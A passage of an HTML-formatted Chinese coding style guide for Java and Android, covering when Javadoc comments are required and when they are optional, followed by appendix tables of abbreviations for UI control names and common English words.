12pt">&#65292;&#36825;&#26159;&#19981;&#27491;&#30830;&#30340;&#12290;&#23427;&#24212;&#35813;&#20889;&#25104;</font></font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">/**Returns the customer ID. */</font></font></font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc298421259"></a>7.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21738;&#37324;&#38656;&#35201;&#20351;&#29992;</span></font>Javadoc</h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33267;&#23569;&#22312;&#27599;&#20010;</span></font></font><font size="3" style="font-size: 12pt">public</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#21450;&#23427;&#30340;&#27599;&#20010;</span></font></font><font size="3" style="font-size: 12pt">public</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;</span></font></font><font size="3" style="font-size: 12pt">protected</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25104;&#21592;&#22788;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20197;&#19979;&#26159;&#19968;&#20123;&#20363;&#22806;&#65306;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc188296676"></a>7.3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20363;&#22806;&#65306;&#19981;&#35328;&#33258;&#26126;&#30340;&#26041;&#27861;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#31616;&#21333;&#26126;&#26174;&#30340;&#26041;&#27861;&#22914;</span></font></font><font size="3" style="font-size: 12pt">getFoo</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26159;&#21487;&#36873;&#30340;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;&#65292;&#26159;&#21487;&#20197;&#19981;&#20889;&#30340;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#36825;&#31181;&#24773;&#20917;&#19979;&#38500;&#20102;&#20889;</span></font></font><font size="3" style="font-size: 12pt">&quot;Returnsthefoo&quot;</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#30830;&#23454;&#20063;&#27809;&#26377;&#20160;&#20040;&#20540;&#24471;&#20889;&#20102;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21333;&#20803;&#27979;&#35797;&#31867;&#20013;&#30340;&#27979;&#35797;&#26041;&#27861;&#21487;&#33021;&#26159;&#19981;&#35328;&#33258;&#26126;&#30340;&#26368;&#24120;&#35265;&#20363;&#23376;&#20102;&#65292;&#25105;&#20204;&#36890;&#24120;&#21487;&#20197;&#20174;&#36825;&#20123;&#26041;&#27861;&#30340;&#25551;&#36848;&#24615;&#21629;&#21517;&#20013;&#30693;&#36947;&#23427;&#26159;&#24178;&#20160;&#20040;&#30340;&#65292;&#22240;&#27492;&#19981;&#38656;&#35201;&#39069;&#22806;&#30340;&#25991;&#26723;&#35828;&#26126;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#26377;&#19968;&#20123;&#30456;&#20851;&#20449;&#24687;&#26159;&#38656;&#35201;&#35835;&#32773;&#20102;&#35299;&#30340;&#65292;&#37027;&#20040;&#20197;&#19978;&#30340;&#20363;&#22806;&#19981;&#24212;&#20316;&#20026;&#24573;&#35270;&#36825;&#20123;&#20449;&#24687;&#30340;&#29702;&#30001;&#12290;&#20363;&#22914;&#65292;&#23545;&#20110;&#26041;&#27861;&#21517;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">getCanonicalName</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23601;&#19981;&#24212;&#35813;&#24573;&#35270;&#25991;&#26723;&#35828;&#26126;&#65292;&#22240;&#20026;&#35835;&#32773;&#24456;&#21487;&#33021;&#19981;&#30693;&#36947;&#35789;&#35821;</span></font></font><font size="3" style="font-size: 12pt">canonicalname</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25351;&#30340;&#26159;&#20160;&#20040;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc721070648"></a>7.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20363;&#22806;&#65306;&#37325;&#36733;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#19968;&#20010;&#26041;&#27861;&#37325;&#36733;&#20102;&#36229;&#31867;&#20013;&#30340;&#26041;&#27861;&#65292;&#37027;&#20040;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24182;&#38750;&#24517;&#38656;&#30340;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc283475582"></a>7.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21487;&#36873;&#30340;</span></font>Javadoc</h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#21253;&#22806;&#19981;&#21487;&#35265;&#30340;&#31867;&#21644;&#26041;&#27861;&#65292;&#22914;&#26377;&#38656;&#35201;&#65292;&#20063;&#26159;&#35201;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#12290;&#22914;&#26524;&#19968;&#20010;&#27880;&#37322;&#26159;&#29992;&#26469;&#23450;&#20041;&#19968;&#20010;&#31867;&#65292;&#26041;&#27861;&#65292;&#23383;&#27573;&#30340;&#25972;&#20307;&#30446;&#30340;&#25110;&#34892;&#20026;&#65292;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#37027;&#20040;&#36825;&#20010;&#27880;&#37322;&#24212;&#35813;&#20889;&#25104;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#36825;&#26679;&#26356;&#32479;&#19968;&#26356;&#21451;&#22909;&#12290;</span></font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc835683268"></a><font face="&#23435;&#20307;"><span lang="zh-CN">&#38468;&#24405;&#65306;</span></font></h1><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#34920;</span></font></font><font size="3" style="font-size: 12pt">1UI</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25511;&#20214;&#32553;&#20889;&#34920;</span></font></font></p><table width="312" cellpadding="1" cellspacing="0"><col width="98"><col width="34"><col width="174"><thead><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#25511;&#20214;</b></font></span></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#32553;&#20889;</b></font></span></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#20363;&#23376;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">LinearLayout</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ll</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">llFriend</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;&#32773;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mFriendLL</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">RelativeLayout</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">rl</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">rlMessage</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mMessageRL</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">FrameLayout</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">fl</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">flCart</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mCartFL</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">TableLayout</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">tl</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">tlTab</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mTabTL</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Button</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btnHome</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mHomeBtn</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ImageButton</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ibtn</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btnPlay</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mPlayIBtn</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">TextView</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">tv</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">tvName</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mNameTV</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">EditText</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">et</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">etName</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mNameET</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ListView</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">lv</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">lvCart</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mCartLV</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ImageView</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">iv</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ivHead</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mHeadIV</font></font></p></td></tr><tr><td width="98" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">GridView</font></font></p></td><td width="34" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">gv</font></font></p></td><td width="174" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">gvPhoto</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">mPhotoGV</font></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#34920;</span></font></font><font size="3" style="font-size: 12pt">2</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24120;&#35265;&#30340;&#33521;&#25991;&#21333;&#35789;&#32553;&#20889;</span></font></font><font size="3" style="font-size: 12pt">:</font></p><table width="560" cellpadding="1" cellspacing="0"><col width="125"><col width="430"><thead><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21517;&#31216;</b></font></span></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#32553;&#20889;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">icon</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ic</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65288;&#20027;&#35201;&#29992;&#22312;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">app</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#30340;&#22270;&#26631;&#65289;</font></span></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">color</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">cl</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65288;&#20027;&#35201;&#29992;&#20110;&#39068;&#33394;&#20540;&#65289;</font></span></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">divider</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">di</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65288;&#20027;&#35201;&#29992;&#20110;&#20998;&#38548;&#32447;&#65292;&#19981;&#20165;&#21253;&#25324;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Listview</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20013;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">divider</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65292;&#36824;&#21253;&#25324;&#26222;&#36890;&#24067;&#23616;&#20013;&#30340;&#32447;&#65289;</font></span></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">selector</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">sl</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65288;&#20027;&#35201;&#29992;&#20110;&#26576;&#19968;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">view</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#22810;&#31181;&#29366;&#24577;&#65292;&#19981;&#20165;&#21253;&#25324;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Listview</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20013;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">selector</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65292;&#36824;&#21253;&#25324;&#25353;&#38062;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">selector</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65289;</font></span></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">average</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">avg</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">background</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">bg</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65288;&#20027;&#35201;&#29992;&#20110;&#24067;&#23616;&#21644;&#23376;&#24067;&#23616;&#30340;&#32972;&#26223;&#65289;</font></span></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">buffer</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">buf</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">control</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ctrl</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">delete</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">del</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">document</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">doc</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">error</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">err</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">escape</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">esc</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">increment</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">inc</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">infomation</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">info</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">initial</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">init</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">image</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">img</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Internationalization</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">I18N</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">length</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">len</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">library</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">lib</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">message</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">msg</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">password</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">pwd</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">position</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">pos</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">server</font></font></p></td><td width="430" style="border: none; padding: 0in"><p 